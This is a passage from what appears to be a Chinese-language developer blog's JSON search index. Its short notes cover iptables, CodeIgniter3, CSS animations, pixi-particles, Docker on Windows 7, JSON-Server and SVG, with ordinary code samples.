--dport 80 -j ACCEPT\n\n\n\n#tranmission\niptables -A INPUT -s 192.168.1.0/24 -p tcp --dport 9091  -j ACCEPT\niptables -A INPUT -p tcp --dport 59999:61000 -j ACCEPT\n```\n\n\n\n[U型遊樂園--海底兩萬里: 防火牆-iptables的state(3)](http://crazyduke.blogspot.com/2009/11/iptablesstate.html)\n[iptables 拒绝所有的连接，再指定 ip 连接? - V2EX](https://www.v2ex.com/t/235392)","tags":["Raspberry Pi"],"categories":["Linux"]},{"title":"float前面有元素會往下擠","url":"%2Fblog%2F2017%2F07%2F06%2Flogdown%2F2017-07-06-2017945%2F","content":"\nhttp://div.io/topic/1278\nhttps://codepen.io/malagege/pen/wexXwv?editors=0100","tags":["float"],"categories":["CSS"]},{"title":"vertical-align對齊屬性筆記","url":"%2Fblog%2F2017%2F07%2F04%2Flogdown%2F2017-07-04-2000076%2F","content":"常常採到inline-block記一下筆記\nhttp://www.cnblogs.com/starof/p/4512284.html","tags":["vertical-align"],"categories":["CSS"]},{"title":"flex遇到float","url":"%2Fblog%2F2017%2F07%2F02%2Flogdown%2F2017-07-02-flex-meet-float%2F","content":"https://jsfiddle.net/nickday/fayzaew2/11/?utm_source=website&utm_medium=embed&utm_campaign=fayzaew2","tags":["float"],"categories":["CSS"]},{"title":"CodeIgniter3 設定 Model","url":"%2Fblog%2F2017%2F06%2F18%2Flogdown%2F2017-06-18-1959922%2F","content":"其實這篇寫的是Model...\n但我覺得我寫的最多應該會是DB Driver Reference\nhttps://codeigniter.org.tw/userguide3/database/db_driver_reference.html?highlight=insert\n\n<!--more-->\n\n```news_m.php\n<?php\n\nclass news_m extends CI_Model {\n\n    public function __construct() {\n        parent::__construct();\n    }\n    public function getData($id = '') {\n        if ($id == ''):\n            return $this->db->get('news');//SELECT * FROM news\n        else:\n            return $this->db->where('id', $id)->get('news');\n        endif;\n    }\n\n    public function insert($post) {\n        $this->db->insert('news', $post);\n    }\n\n    public function update($post) {\n        $this->db->where('id', $post['id'])->update('news', $post);\n    }\n\n    public function delete($id) {\n        $this->db->where('id', $id)->delete('news');\n    }\n```","tags":["Model"],"categories":["CodeIgniter3"]},{"title":"CodeIgniter3 設定 View","url":"%2Fblog%2F2017%2F06%2F18%2Flogdown%2F2017-06-18-1959863%2F","content":"曾經看過一個文\n他說php本身就是樣版引擎\n不需要特別載入\n\n之前有用過twig簡單的樣版引擎\nCoeIgniter本身就是用php\n當然也可以使用自己最愛用的\n\n<!--more-->\nhttps://codeigniter.org.tw/userguide3/general/views.html\n\n載入`$this->load->view('name');`在Controller特別簡單\n沒有什麼難度XD\n\n#動態資料載入到 View\n\n```\n$data = array(\n        'title' => 'My Title',\n        'heading' => 'My Heading',\n        'message' => 'My Message'\n);\n\n$this->load->view('blogview', $data);\n\n//然後這裡是運用物件的方法傳入：\n$data = new Someclass();\n$this->load->view('blogview', $data);\n```\n>如果你是用物件，類別變數將會被轉成陣列元素。\n\n```blogview.php\n<html>\n<head>\n   <title><?=title?></title>\n</head>\n<body>\n<h1><?=heading?></h1>\n<?=message?>\n</body>\n</html>\n```\n\n跟Controller可以放在資料夾裡面\n`$this->load->view('directory_name/file_name');`\n\n看到官方View比較特別的寫法https://codeigniter.org.tw/userguide3/general/alternative_php.html\n```\n<html>\n<head>\n        <title><?php echo $title;?></title>\n</head>\n<body>\n        <h1><?php echo $heading;?></h1>\n\n        <h3>My Todo List</h3>\n\n        <ul>\n        <?php foreach ($todo_list as $item):?>\n\n                <li><?php echo $item;?></li>\n\n        <?php endforeach;?>\n        </ul>\n\n</body>\n</html>\n```\n\n這段` foreach ($todo_list as $item):`頭，` endforeach;`尾\n老實說這樣寫View會比較好看，但可能要花一段時間習慣他\n\n```$string = $this->load->view('myfile', '', TRUE);```\n就跟`$string = var_dump($a, TRUE );`和`$string  = print_r($a,TRUE )`做一樣事情\n\nCI3不知道為什麼，log_message不能放Object進去\n不然會被卡入....\n\nVIEW這篇還滿簡單的，有基處PHP看一下應該就會用了吧。","tags":["View"],"categories":["CodeIgniter3"]},{"title":"CodeIgniter3 設定 Controllers","url":"%2Fblog%2F2017%2F06%2F18%2Flogdown%2F2017-06-18-1959613%2F","content":"一直以為建立Controller一定要設定Router\n我以為這是一定要的啦\n但今天我看了官網文件\n原來可以不用做XD\nhttps://codeigniter.org.tw/userguide3/general/controllers.html\n\n<!--more-->\n**檔案一定要被命名為 ‘Blog.php’，第一個字母必須大寫 ‘B’。\n類別名稱必須以大寫字母開頭。**\n\n\n```\n        public function __construct()\n        {\n                parent::__construct();\n                // Your own constructor code\n        }\n```\n這一句一定要貼到你的Controller裡面\n\n我覺得比較有趣的是\nController還可以放在資料夾裡面\n例如`controller/users/user.php`網址可以輸入`http://localhost/ci3/user/test2fff`\n\n\\_remap好像照uri重新對印method\n\n\\_remap,output目前還不知道能運用在哪些地方\n\n此篇筆記到這\n`php\n<?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');\n\nclass User extends CI_Controller {\n\n    public function __construct()\n    {\n        parent::__construct();\n    }\n\n    public function index()\n    {\n        echo \"Hello World\";\n    }\n\n    public function index2()\n    {\n        echo \"Hello World2\";\n    }\n\n    public function index3($a1,$a2)\n    {\n        echo \"Hello World:\" . $a1 . $a2;\n    }\n\n    public function _remap($method)\n    {\n            if ($method === 'index2')\n            {\n                    $this->$method();\n            }\n            else\n            {\n                    $this->index();\n            }\n    }\n\n\n    public function _output($output)\n    {\n            echo $output.'ffff';\n    }\n\n    private function _test()\n    {\n        echo 'test';\n    }\n}\n/* End of file User.php */\n/* Location: ./application/controllers/User.php */\n`","tags":["Controllers"],"categories":["CodeIgniter3"]},{"title":"CodeIgniter3 設定 Router","url":"%2Fblog%2F2017%2F06%2F18%2Flogdown%2F2017-06-18-1959505%2F","content":"`routes.php`可以設定CodeIgniter路由\n這邊是設定所有路由\n好像跟Rails設定方法有點不太一樣\n不過也滿好懂的\n\n<!--more-->\n\n```routes.php\n$route['default_controller'] = 'welcome';\n$route['404_override'] = '';\n$route['translate_uri_dashes'] = FALSE;\n```\n\n預設導置Controller的Welcome.php那隻(PS:Contoller規定一開始要大寫)\n 'welcome' 後面method沒寫，就是導置`welcome/index`\n\n 當上面條件抓到，就會馬上導到Contoller\n 所以上下規則還算滿重要的\n\n 官網這篇寫的還滿清楚的\n https://codeigniter.org.tw/userguide3/general/routing.html\n\n> (:num) 將匹配只含有數字的一個片段。 (:any) 將匹配含有任何字元的一個片段（除了 ‘/’，這是區段界定符號）。\n萬用字元實際上是正規表達式的別名， :any 被翻譯成 [^/]+ 以及 :num 被翻譯成 [0-9]+ 。\n\n```\n$route['login/(.+)'] = 'auth/login/$1';\n$route['login/(:any)'] = 'auth/login/$1';\n```\n\n簡單可以用正規化來定義路由設定\n\n\n#路由中使用 HTTP 動詞\n\n> 例如：\n$route['products']['put'] = 'product/insert';\n上述例子，PUT 請求到 URI“products” 稱之為 Product::insert() 控制器方法。\n$route['products/(:num)']['DELETE'] = 'product/delete/$1';\nDELETE 請求到 URL“products”第一個片段，數字在第二個片段將會重新映射到 Product::delete() 方法，傳入數值到第一個參數上。\n使用 HTTP 動詞當然是可選的（非必要）。\n\n還有此功能，有空來試試吧:P","tags":["CodeIgniter3"],"categories":["CodeIgniter3"]},{"title":"在Window用XAMPP架CodeIgniter3","url":"%2Fblog%2F2017%2F06%2F18%2Flogdown%2F2017-06-18-in-xampp-for-window-codeigniter3%2F","content":"最近有在學CodeIgniter3，想說再不敢快作筆記\n會忘了特別快，雖然採用快速架站的XAMPP來架\n但也有遇到一點點問題\n在此做一下筆記\n\n<!--more-->\n\n下載XAMPP解壓縮到你要裝的地方\n再來`setup_xampp.bat`他會對XAMPP做設定\n然後就可以啟用`xampp-control.exe`\n\n再這之前\n在把CodeIgniter3丟到htdocs目錄下\n打開瀏覽器`http://localhost/ci3`(PS:我資料夾改成ci3)\n```\nWelcome to CodeIgniter!\n\nThe page you are looking at is being generated dynamically by CodeIgniter.\n\nIf you would like to edit this page you'll find it located at:\napplication/views/welcome_message.php\n\nThe corresponding controller for this page is found at:\napplication/controllers/Welcome.php\n\nIf you are exploring CodeIgniter for the very first time, you should start by reading the User Guide.\n```\n看到這個畫面就成功了\n\n接下來我們要去設定DB設定\n\n首先去config.php把database啟用\n`$autoload['libraries'] = array('database');`\n通常session也滿常用的，通常我也會順便啟用session\n`$autoload['libraries'] = array('database','session');`\n\n這個也滿常用的\n`$autoload['helper'] = array('url');`\n\n接下來就是設定database.php\n預設XAMPP沒有設定root帳號、密碼\n但我這邊就不設定，正式還境通常要設定喔\n\n```php\n$db['default'] = array(\n\t'dsn'\t=> '',\n\t'hostname' => 'localhost',\n\t'username' => '',\n\t'password' => '',\n\t'database' => 'test',\n\t'dbdriver' => 'mysqli',\n\t'dbprefix' => '',\n\t'pconnect' => FALSE,\n\t'db_debug' => (ENVIRONMENT !== 'production'),\n\t'cache_on' => FALSE,\n\t'cachedir' => '',\n\t'char_set' => 'utf8',\n\t'dbcollat' => 'utf8_general_ci',\n\t'swap_pre' => '',\n\t'encrypt' => FALSE,\n\t'compress' => FALSE,\n\t'stricton' => FALSE,\n\t'failover' => array(),\n\t'save_queries' => TRUE\n);\n```\n再開瀏覽器`http://locahost/ci3`，顯示正常\n這樣架設就算完成\n\n有時你ci3不是載在第一層目錄\n請記得照下面設定\n```\nRewriteEngine On\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^(.*)$ /(目錄path)/index.php/$1 [L]\n```","tags":["XAMPP"],"categories":["CodeIgniter"]},{"title":"JavaScript ,逗號運算符號","url":"%2Fblog%2F2017%2F06%2F16%2Flogdown%2F2017-06-16-1954776%2F","content":"```javascript\nfunction(e) {\n  if (!e.ctrlKey && !e.shiftKey && !e.altKey) {\n    $(\".site\").addClass(\"fade-out\"), $(\".mfp-close\").trigger(\"click\");\n    var t = $(this).attr(\"href\");\n    return setTimeout(function() {\n      location.href = t\n    }, 600), !1\n  }\n}\n```\n\n最近看到這段程式很好奇為什麼return 回去後面要加,變數\n沒想到能這樣用\n記錄一下\n\n參考來源：\n https://developer.mozilla.org/zh-TW/docs/Web/JavaScript/Reference/Operators/Comma_Operator\n\nJS逗号运算符的用法详解(转) - pinocchioatbeijing - 博客园\nhttp://www.cnblogs.com/pinocchioatbeijing/articles/2343736.html\n\nJavaScript 的逗號操作符\nhttp://www.jstips.co/zh_tw/javascript/comma-operaton-in-js/\n\n","tags":["JavaScript"],"categories":["JavaScript"]},{"title":"點超連結頁面動畫特效","url":"%2Fblog%2F2017%2F06%2F13%2Flogdown%2F2017-06-13-1948791%2F","content":"最近還有個東西沒記錄\n點連結動畫特效\n覺得還不錯，就小小研究\n照下面網站參照做個小小範例\nhttp://nora-anime.net/\n\n<!--more-->\n\n```html\n<div class=\"header-menu\">1</div>\n<div class=\"header-menu\">2</div>\n<div class=\"header-menu\">3</div>\n<div class=\"header-menu\">4</div>\n<div class=\"header-menu\">5</div>\n<div class=\"header-menu\">6</div>\n<div class=\"header-menu\">7</div>\n<div class=\"header-menu\">8</div>\n<div class=\"header-menu\">9</div>\n<div class=\"header-menu\">10</div>\n<input type=\"button\" id=\"btn\" value=\"toggle\" />\n```\n\n```css\n@keyframes menu-in-s {\n    0% {\n        opacity: 0;\n        -webkit-transform: translateY(40px);\n        transform: translateY(40px);\n        -webkit-animation-timing-function: ease-out;\n        animation-timing-function: ease-out\n    }\n    80% {\n        opacity: 1;\n        -webkit-transform: translateY(-4px);\n        transform: translateY(-4px)\n    }\n    100% {\n        -webkit-transform: translateY(0);\n        transform: translateY(0)\n    }\n}\n\n@keyframes menu-out-s {\n    0% {\n        opacity: 1;\n        -webkit-transform: translateY(0);\n        transform: translateY(0);\n        -webkit-animation-timing-function: cubic-bezier(.23, 1, .32, 1);\n        animation-timing-function: cubic-bezier(.23, 1, .32, 1)\n    }\n    100% {\n        opacity: 0;\n        -webkit-transform: translateY(40px);\n        transform: translateY(40px);\n    }\n}\n.header-menu:nth-of-type(1) {\n    -webkit-animation: menu-in-s .4s linear 0s 1 normal both;\n    animation: menu-in-s .4s linear 0s 1 normal both\n}\n.header-menu:nth-of-type(2) {\n    -webkit-animation: menu-in-s .4s linear .05s 1 normal both;\n    animation: menu-in-s .4s linear .05s 1 normal both\n}\n.header-menu:nth-of-type(3) {\n    -webkit-animation: menu-in-s .4s linear .1s 1 normal both;\n    animation: menu-in-s .4s linear .1s 1 normal both\n}\n.header-menu:nth-of-type(4) {\n    -webkit-animation: menu-in-s .4s linear .15s 1 normal both;\n    animation: menu-in-s .4s linear .15s 1 normal both\n}\n.header-menu:nth-of-type(5) {\n    -webkit-animation: menu-in-s .4s linear .2s 1 normal both;\n    animation: menu-in-s .4s linear .2s 1 normal both\n}\n.header-menu:nth-of-type(6) {\n    -webkit-animation: menu-in-s .4s linear .25s 1 normal both;\n    animation: menu-in-s .4s linear .25s 1 normal both\n}\n.header-menu:nth-of-type(7) {\n    -webkit-animation: menu-in-s .4s linear .3s 1 normal both;\n    animation: menu-in-s .4s linear .3s 1 normal both\n}\n.header-menu:nth-of-type(8) {\n    -webkit-animation: menu-in-s .4s linear .35s 1 normal both;\n    animation: menu-in-s .4s linear .35s 1 normal both\n}\n.header-menu:nth-of-type(9) {\n    -webkit-animation: menu-in-s .4s linear .4s 1 normal both;\n    animation: menu-in-s .4s linear .4s 1 normal both\n}\n.header-menu:nth-of-type(10) {\n    -webkit-animation: menu-in-s .4s linear .45s 1 normal both;\n    animation: menu-in-s .4s linear .45s 1 normal both\n}\n\n\n\n.header-menu-fadeout:nth-of-type(1) {\n    -webkit-animation: menu-out-s .4s linear .36s 1 normal both;\n    animation: menu-out-s .4s linear .36s 1 normal both\n}\n.header-menu-fadeout:nth-of-type(2) {\n    -webkit-animation: menu-out-s .4s linear .32s 1 normal both;\n    animation: menu-out-s .4s linear .32s 1 normal both\n}\n.header-menu-fadeout:nth-of-type(3) {\n    -webkit-animation: menu-out-s .4s linear .28s 1 normal both;\n    animation: menu-out-s .4s linear .28s 1 normal both\n}\n.header-menu-fadeout:nth-of-type(4) {\n    -webkit-animation: menu-out-s .4s linear .24s 1 normal both;\n    animation: menu-out-s .4s linear .24s 1 normal both\n}\n.header-menu-fadeout:nth-of-type(5) {\n    -webkit-animation: menu-out-s .4s linear .2s 1 normal both;\n    animation: menu-out-s .4s linear .2s 1 normal both\n}\n.header-menu-fadeout:nth-of-type(6) {\n    -webkit-animation: menu-out-s .4s linear .16s 1 normal both;\n    animation: menu-out-s .4s linear .16s 1 normal both\n}\n.header-menu-fadeout:nth-of-type(7) {\n    -webkit-animation: menu-out-s .4s linear .12s 1 normal both;\n    animation: menu-out-s .4s linear .12s 1 normal both\n}\n.header-menu-fadeout:nth-of-type(8) {\n    -webkit-animation: menu-out-s .4s linear .08s 1 normal both;\n    animation: menu-out-s .4s linear .08s 1 normal both\n}\n.header-menu-fadeout:nth-of-type(9) {\n    -webkit-animation: menu-out-s .4s linear .04s 1 normal both;\n    animation: menu-out-s .4s linear .04s 1 normal both\n}\n.header-menu-fadeout:nth-of-type(10) {\n    -webkit-animation: menu-out-s .4s linear 0s 1 normal both;\n    animation: menu-out-s .4s linear 0s 1 normal both\n}\n\n\n.header-menu-fadeout{\n  pointer-events: none;\n}\n\n```\n\n\n```javascript\ndocument.getElementById('btn').addEventListener(\"click\",function(){\n document.querySelectorAll('.header-menu').forEach((el)=>{\n   var className = \"header-menu-fadeout\";\n  if (el.classList) {\n  el.classList.toggle(className);\n} else {\n  var classes = el.className.split(' ');\n  var existingIndex = classes.indexOf(className);\n\n  if (existingIndex >= 0)\n    classes.splice(existingIndex, 1);\n  else\n    classes.push(className);\n\n  el.className = classes.join(' ');\n}\n });\n});\n\n```\n\n*可用`event.preventDefault();`來解決a連結事件動作*\ncss可用SASS用回圈寫\n<a class=\"jsbin-embed\" href=\"http://jsbin.com/zipavemefa/embed?html,js,output\">JS Bin on jsbin.com</a><script src=\"http://static.jsbin.com/js/embed.min.js?4.0.4\"></script>","categories":["網頁特效"]},{"title":"pixi-particles 羽毛特效分析筆記","url":"%2Fblog%2F2017%2F06%2F04%2Flogdown%2F2017-06-04-pixi-particles-feather-effect-analysis-notes%2F","content":"![](http://i.imgur.com/gSfaqHF.gif)\n上篇記錄了[[CSS]看的到確摸不到的pointer-events屬性]( http://malagege.logdown.com/posts/1864913-css-does-not-touch-the-pointer-events-property)\n裡面還有很炫的旋轉嶼毛特效\n\n本來以為是計時器慢慢一秒做下去做旋轉\n結果看code，竟然是pixijs特效做的\n<!--more-->\n\n[突破 D3.js 的速度極限 — 2D WebGL 與 PIXI.js](http://blog.infographics.tw/2015/12/pixi-introduction/)\n[Pixi.js 中文教學](https://www.gitbook.com/book/supermrji/pixi-js/details)\n\n簡單爬一下，PixiJS算是能幫你做出動畫用WebGL 加速\n因此動畫會非常順暢(應該吧，我沒用過)\n\n旋轉是透過下面的套件來實作的\n[pixijs/pixi-particles: A particle system for PixiJS](https://github.com/pixijs/pixi-particles)\n官網有一些範例\n\n雨毛旋轉範例是用snow特效\n官方雨毛旋轉特效\n```json\n{\n\t\"alpha\": {\n\t\t\"start\": 1,\n\t\t\"end\": 0.5\n\t},\n\t\"scale\": {\n\t\t\"start\": 1,\n\t\t\"end\": 0.7,\n\t\t\"minimumScaleMultiplier\": 0.5\n\t},\n\t\"color\": {\n\t\t\"start\": \"#ffffff\",\n\t\t\"end\": \"#ffffff\"\n\t},\n\t\"speed\": {\n\t\t\"start\": 100,\n\t\t\"end\": 75\n\t},\n\t\"acceleration\": {\n\t\t\"x\": 0,\n\t\t\"y\": 0\n\t},\n\t\"startRotation\": {\n\t\t\"min\": 80,\n\t\t\"max\": 100\n\t},\n\t\"rotationSpeed\": {\n\t\t\"min\": 10,\n\t\t\"max\": 40\n\t},\n\t\"lifetime\": {\n\t\t\"min\": 10,\n\t\t\"max\": 10\n\t},\n\t\"blendMode\": \"normal\",\n\t\"ease\": [\n\t\t{\n\t\t\t\"s\": 0,\n\t\t\t\"cp\": 0.379,\n\t\t\t\"e\": 0.548\n\t\t},\n\t\t{\n\t\t\t\"s\": 0.548,\n\t\t\t\"cp\": 0.717,\n\t\t\t\"e\": 0.676\n\t\t},\n\t\t{\n\t\t\t\"s\": 0.676,\n\t\t\t\"cp\": 0.635,\n\t\t\t\"e\": 1\n\t\t}\n\t],\n\t\"frequency\": 0.5,\n\t\"emitterLifetime\": -1,\n\t\"maxParticles\": 140,\n\t\"pos\": {\n\t\t\"x\": 0,\n\t\t\"y\": 0\n\t},\n\t\"addAtBack\": false,\n\t\"spawnType\": \"rect\",\n\t\"spawnRect\": {\n\t\t\"x\": 0,\n\t\t\"y\": 0,\n\t\t\"w\": 900,\n\t\t\"h\": 100\n\t}\n}\n```\n可把上方內容載入到[PixiParticlesEditor](http://pixijs.github.io/pixi-particles-editor/)\n在把雨毛傳到上面，這樣就可以在PixiParticlesEditor看到特效\n\npixi-particles上面還有很多特效值的玩一玩\n好像還能運用在RPG Maker上面\n[PixiParticlesEditor　pixi.js特效 - RPG Maker MV 讨论区 - 66RPG - Powered by Discuz!](http://rm.66rpg.com/thread-386105-1-1.html)\n參考來源：\n[pixi.jsを勉強する[2] -PIXI Particles- - [ALL]| アクアリングBLOG](http://blog.aquaring.co.jp/517)\n[PixiParticlesEditor](http://pixijs.github.io/pixi-particles-editor/)\n","categories":["pixi"]},{"title":"CodeIgniter Session錯誤問題","url":"%2Fblog%2F2017%2F06%2F02%2Flogdown%2F2017-06-02-codeigniter-session-error-problems%2F","content":"在config設定\n```\n$config['sess_save_path'] =BASEPATH.'../'.'session_file';\n```\nhttp://codeigniter.org.cn/forums/thread-21295-1-1.html\n由於我是用Docker設定\n目前猜測可能權限有問題...\n導制錯誤\n在此記錄，不然一下就忘記了XD\n","categories":["CodeIgniter"]},{"title":"在Win7安裝Docker(下) - Window Volumes問題","url":"%2Fblog%2F2017%2F06%2F02%2Flogdown%2F2017-06-02-win7-installation-docker-part-two%2F","content":"上篇Docker裝的還滿順利的，但RUN  https://github.com/bitnami/bitnami-docker-codeigniter\n就發生了問題\n```\nERROR: for s_myapp_1  Cannot create container for service myapp: invalid bind mo\nunt spec \"C:\\\\Users\\\\computer\\\\Desktop\\\\s:/app:rw\": invalid volume specification\n: 'C:\\Users\\computer\\Desktop\\s:/app:rw'\n\nERROR: for myapp  Cannot create container for service myapp: invalid bind mount\nspec \"C:\\\\Users\\\\computer\\\\Desktop\\\\s:/app:rw\": invalid volume specification: 'C\n:\\Users\\computer\\Desktop\\s:/app:rw'\nERROR: Encountered errors while bringing up the project.\n```\n<!--more-->\n\n網路爬文有找到幾個方法，但都沒什麼用\nhttp://qiita.com/ysti/items/aed9c766aed00fe731fc\nhttp://www.cnblogs.com/anliven/p/6481516.html\nhttps://xbug.lol/1341.html\nhttp://yanjunbiao.me/2016/01/03/Volume-Mount-Issue-of-Docker-on-Windows/\n\n`/c/Users/`和'`//C/Users/`都還不行\n\n後來發現奇怪，怎麼MariaDB怎麼會有Volumes設定\n```yml\nversion: '2'\n\nservices:\n  mariadb:\n    image: 'bitnami/mariadb:latest'\n    labels:\n      kompose.service.type: nodeport\n    ports:\n      - '3306:3306'\n    volumes:\n      - 'mariadb_data:/bitnami/mariadb'\n    environment:\n      # ALLOW_EMPTY_PASSWORD is recommended only for development.\n      - ALLOW_EMPTY_PASSWORD=yes\n\nvolumes:\n  mariadb_data:\ndriver: local\n```\n\n喔喔，原來可以加volumes\n\n```yml\nversion: '2'\nservices:\n  myapp:\n    image: 'bitnami/codeigniter:latest'\n    labels:\n      kompose.service.type: nodeport\n    ports:\n      - '8000:8000'\n    volumes:\n      - 'myapp_data:/app'\n    depends_on:\n      - mariadb\n  mariadb:\n    image: 'bitnami/mariadb:latest'\n    environment:\n      - ALLOW_EMPTY_PASSWORD=yes\nvolumes:\n  myapp_data:\n    driver: local\n```\n就正常了\n\n想說這樣應該能很順利，但...馬上就遇到Network問題\nDocker port沒法轉到實體IP上面\n我記得在VM跑ubuntu docker沒有這個問題\n該不會又是Windows ....\n\n想說這個能解決\nhttps://blog.ephrain.net/virtualbox-%E4%BD%BF%E7%94%A8-port-forwarding-%E9%80%A3%E4%B8%8A-nat-%E6%A8%A1%E5%BC%8F%E4%B8%8B%E7%9A%84-vm/\n遺憾還是不能....\n\n[怎麼在win10 上安裝docker desktop ~ 迪貝之家](https://www.dbaid.tw/2021/07/win10-docker-desktop.html)","tags":["Volumes"],"categories":["Docker"]},{"title":"在Win7安裝Docker(上)","url":"%2Fblog%2F2017%2F06%2F01%2Flogdown%2F2017-06-01-win7-installation-docker%2F","content":"由於最近想跑一此程式，想玩Docker\n可是工司遠端環境有用VMWare，這個又不能跟Docker 相容\n想說用一台筆電用boot2docker玩玩看好了\n<!--more-->\n > Deprecated\n> This project (the boot2docker Windows Installer) is officially deprecated in favor of the new Docker Toolbox.\n\n經過爬文 Docker Toolbox 能在Windows 7上跑\n原理是用Virtualbox跑VM\n\n就來安裝看看，結果桌面的Docker Quickstart Terminal打不開害我緊張一下。\nKitematic 還滿OK順利可以執行。\n\n步驟有看到這下面這個網站寫的很清楚了\nhttps://sites.google.com/a/fuanps.tp.edu.tw/d4s/4-jian-zhi/kitematic-alpha-for-windows\n\n想說一切都很順利，但沒想到裝\nhttps://github.com/bitnami/bitnami-docker-codeigniter\n發生幾個問題....留下篇寫\n\n","categories":["Docker"]},{"title":"好用的前端測試工具JSON-Server","url":"%2Fblog%2F2017%2F05%2F30%2Flogdown%2F2017-05-30-1898666%2F","content":"今天在Facebook看[保哥直播](https://www.facebook.com/will.fans/videos/vb.119279178101235/1702264796469324/)\n介紹好用的JSON Server，要如何做好快速建立JSON Resful測試環境\n簡單做一下筆記\n<!--more-->\n```\nnpm install -g json-server\n```\n\n```\njson-server  -w db.json\n```\n就可以完成一個簡單Web Server\n但是這個並非安全的，預設有CORS\n\n並非只有存JSON查詢，有 新增/修改/刪除 功能\n\n最後他還介紹了，這還有router功能...\n這真是強大的測試工具。\n\n\n<iframe src=\"//www.slideshare.net/slideshow/embed_code/key/k8pFoqsYS0jNr\" width=\"595\" height=\"485\" frameborder=\"0\" marginwidth=\"0\" marginheight=\"0\" scrolling=\"no\" style=\"border:1px solid #CCC; border-width:1px; margin-bottom:5px; max-width: 100%;\" allowfullscreen> </iframe> <div style=\"margin-bottom:5px\"> <strong> <a href=\"//www.slideshare.net/WillHuangTW/angular-2-advanced-topic-rxjs\" title=\"Angular 2 開發實戰：進階開發篇 - RxJS 新手入門\" target=\"_blank\">Angular 2 開發實戰：進階開發篇 - RxJS 新手入門</a> </strong> from <strong><a target=\"_blank\" href=\"https://www.slideshare.net/WillHuangTW\">Will Huang</a></strong> </div>\n\n\n<iframe src=\"https://www.facebook.com/plugins/video.php?href=https%3A%2F%2Fwww.facebook.com%2Fwill.fans%2Fvideos%2F1702264796469324%2F&show_text=0&width=560\" width=\"560\" height=\"315\" style=\"border:none;overflow:hidden\" scrolling=\"no\" frameborder=\"0\" allowTransparency=\"true\" allowFullScreen=\"true\"></iframe>","tags":["JSON-Server"],"categories":["實用工具"]},{"title":"SVG筆記紀錄(一)","url":"%2Fblog%2F2017%2F05%2F29%2Flogdown%2F2017-05-29-svg-notes%2F","content":"最近覺得前端計術還滿重要的\n趁著動畫課程還沒開始\n把一些基本功學一學\n\n主要參考這篇教學\n[SVG 完整教學 31 天 ](http://www.oxxostudio.tw/articles/201410/svg-tutorial.html\n\n<!--more-->\n\n目前看到Day4 SVG Path 基礎篇\n在這篇簡單記錄看Day1~Day4筆記\n\nDay2 SVG Layer介紹，`一般在向量軟體都是最上層圖層在上面`\n但換在Code裡面，`SVG最下面才是最上層`\n\nSVG 研究之路 (3) - 基本形狀\n\n矩形 `rect `\n圓角矩形 `rect rx ry`\n圓形`circle cx cy r`\n橢圓`ellipse cx cy rx ry`\n多邊形`polygon  points`\n\nSVG 研究之路 (4) - Path 基礎篇\n這篇感覺就還滿難的，貝茲曲線不知道麼畫\n看懂在寫...\n\n    M = moveto\n    L = lineto\n    H = horizontal lineto\n    V = vertical lineto\n    C = curveto\n    S = smooth curveto\n    Q = quadratic Bézier curve\n    T = smooth quadratic Bézier curveto\n    A = elliptical Arc\n    Z = closepath\n\n------\n參考來源：\nSVG <path>\nhttps://www.w3schools.com/graphics/svg_path.asp\n\nSVG 超硬派了解 line, polygon, polyline, path (手工繪製)\nhttps://wcc723.github.io/d3js/2014/10/02/Ironman-30-days-03/\n\n四個 SVG 動畫應用範例 － Firefox 十週年活動網站技術解密\nhttp://tech.mozilla.com.tw/posts/5660/%E5%9B%9B%E5%80%8B-svg-%E5%8B%95%E7%95%AB%E6%87%89%E7%94%A8%E7%AF%84%E4%BE%8B-%EF%BC%8D-firefox-%E5%8D%81%E9%80%B1%E5%B9%B4%E6%B4%BB%E5%8B%95%E7%B6%B2%E7%AB%99%E6%8A%80%E8%A1%93%E8%A7%A3%E5%AF%86\n\ncubic-bezier\nhttp://cubic-bezier.com/\n\n練習畫向量圖\nhttp://bezier.method.ac/\n\n","tags":["SVG"],"categories":["HTML"]},{"title":"[CSS]看的到確摸不到的pointer-events屬性","url":"%2Fblog%2F2017%2F05%2F22%2Flogdown%2F2017-05-22-css-does-not-touch-the-pointer-events-property%2F","content":"其實這篇是網站特效筆記\n但還是分開兩個，方便以後參考\n\n<!--more-->\n\n![](http://i.imgur.com/gSfaqHF.gif)\n[http://www.tenshi-no-3p.com/](http://www.tenshi-no-3p.com/)網站看到下圖特效，往下飄的羽毛竟然放在前面\n怎麼不會擋住下面的連結\n經過仔細的探討\n原來CSS有pointer-events好用的屬性\n在此筆記:D\n```css\npointer-events: none;\n```\n就這麼簡單\n<script async src=\"//jsfiddle.net/aucwaogL/embed/html,css,result/\"></script>\n\n至於羽毛特效之後在分悉怎麼用的(pixi.js)\n[http://blog.aquaring.co.jp/517](http://blog.aquaring.co.jp/517)\n\n參考來源：\n穿透的 div ( pointer-events )\n[http://www.oxxostudio.tw/articles/201409/pointer-events.html](http://www.oxxostudio.tw/articles/201409/pointer-events.html)\n\npointer-events\n[https://developer.mozilla.org/zh-TW/docs/Web/CSS/pointer-events?v=control](https://developer.mozilla.org/zh-TW/docs/Web/CSS/pointer-events?v=control)","tags":["pointer-events"],"categories":["CSS"]},{"title":"用animsition製作閃動網站特效記錄","url":"%2Fblog%2F2017%2F05%2F21%2Flogdown%2F2017-05-21-1862646%2F","content":"好久沒有分析網頁特效了\n前篇都不知道過多少年了XD\n最近有看到幾個07月新番網站還不錯來筆記一下\n\n<!--more-->\n\n\n![GIF.gif](http://user-image.logdown.io/user/8284/blog/8171/post/1862646/7HrEqtSbTjWeJm3hdJR3_GIF.gif)\nhttp://colopl.co.jp/battlegirl-hs/anime/\n\n這個特效還不錯的，本來想看一下怎麼使用\n```\n<div style=\"animation-duration: 800ms;\" class=\"animsition-overlay-slide overlay-slide-in-bottom\"></div>\n```\n一找還發現有現程寫好的套件可以使用\n[http://git.blivesta.com/animsition/]()\n\n官網還有很多套件\n[http://www.blivesta.com/](http://www.blivesta.com/)\n[https://github.com/blivesta/](https://github.com/blivesta/)\n\n<script async src=\"//jsfiddle.net/1wfuoabL/4/embed/html,css,result/\"></script>\n\n還滿簡單","categories":["網頁特效"]},{"title":"[javascript]if(-1)  結果","url":"%2Fblog%2F2017%2F05%2F15%2Flogdown%2F2017-05-15-1840469%2F","content":"遇到一個雷...，記錄一下\n```javascript\nvar a = -1;\nif(a){\necho 'hello world';\n}\n```\n\n\n\n[denysdovhan/wtfjs: A list of funny and tricky JavaScript 